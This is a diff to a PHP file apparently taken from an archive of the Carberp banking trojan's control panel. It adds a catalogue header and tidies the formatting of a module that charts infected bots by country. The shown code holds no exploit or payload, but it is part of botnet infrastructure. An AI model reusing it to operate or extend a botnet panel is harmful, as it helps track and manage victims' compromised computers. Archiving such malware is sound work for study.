@@ -1,8 +1,20 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 include_once('modules/bots/country_code.php');
 $list = array();
 
-function reasult_data($row){	global $list;
+function reasult_data($row){
+	global $list;
 	$list[strtoupper($row->country)] = $row->count;
 }
 
@@ -15,11 +27,16 @@ $all_count = array_sum($list);
 $other_count = '0';
 
 $i=0;
-foreach($list as $key => $value){	$i++;
-	if(number_format(($value / $all_count) * 100, 2) > '1.5'){		if(empty($country_code[$key])){			print('<slice title="'.$lang['neizvestno'].'">'.$value.'</slice>');
-		}else{			print('<slice title="'.$country_code[$key].'">'.$value.'</slice>');
+foreach($list as $key => $value){
+	$i++;
+	if(number_format(($value / $all_count) * 100, 2) > '1.5'){
+		if(empty($country_code[$key])){
+			print('<slice title="'.$lang['neizvestno'].'">'.$value.'</slice>');
+		}else{
+			print('<slice title="'.$country_code[$key].'">'.$value.'</slice>');
 		}
-	}else{		$other_count += $value;
+	}else{
+		$other_count += $value;
 	}
 }
 if($other_count > 0) print('<slice title="'.$lang['ostalnie'].'" pull_out="true">'.$other_count.'</slice>');
